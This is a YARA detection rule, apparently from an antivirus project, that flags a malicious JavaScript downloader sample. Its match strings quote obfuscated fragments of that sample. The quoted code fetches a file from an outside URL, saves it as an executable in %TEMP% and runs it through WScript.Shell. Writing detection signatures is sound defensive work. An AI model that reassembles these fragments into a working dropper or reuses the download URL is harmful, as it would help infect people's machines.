rule sig_20160328_558403c9c726bc17e9fe188f092ea8dd {
  meta:
    description = "datamaliciousorder - file 20160328_558403c9c726bc17e9fe188f092ea8dd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "46702f9b3d4da8aefb2d3131bba21bbf7d687cac01ed2d8f947dcc3191aac0c2"

  strings:
    $s1  = "function Rbpkn() {return Gtulgwexzr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"d1F6LWHm7.exe\";};" fullword ascii
    $s2  = "do {WScript[Bouovdhy](Qzxswzj() * 11)} while (Nosnryuzsd[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Nosnryuzsd[Ytzdcuxxse](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s4  = "function Xawpjzfkqz(Bkeabe, Qdrjx){return Bkeabe - Qdrjx;};" fullword ascii
    $s5  = "var Gtulgwexzr = function Puftqjblxb() {return WScript[Sgoisbjhm](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Zaxckntnk() {return ((Dposztzzs == true) && (Dposztzzs == Kpcilpm)) ? 1 : Fjggm;};" fullword ascii
    $s7  = "function Rkmtx(Zqtufm){Gtulgwexzr[\"Run\"](Zqtufm, Fjggm, Fjggm);};" fullword ascii
    $s8  = "Dposztzzs = true; " fullword ascii
    $s9  = "var Dposztzzs = false;" fullword ascii
    $s10 = " while (Jwvwptdjre){" fullword ascii
    $s11 = "var Msbxfj = new this[\"Date\"]();" fullword ascii
    $s12 = "var Ymdmtjoy = false;" fullword ascii
    $s13 = "function Cknvzdf(){return Sgoisbjhm;};" fullword ascii
    $s14 = "function Qzxswzj(){return 22;};" fullword ascii
    $s15 = "function Lrltx(){return Yleicujl;};" fullword ascii
    $s16 = "function Ehwfbxdy(Zgmcu) {var Txkciy = (1, 2, 3, 4, 5, Zgmcu); return Txkciy;};" fullword ascii
    $s17 = "function Yfzkdrjpj()" fullword ascii
    $s18 = "Kpcilpm = true; " fullword ascii
    $s19 = "return Xawpjzfkqz(Tahleivfvj, Qiuavvsw);" fullword ascii
    $s20 = "var Kpcilpm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}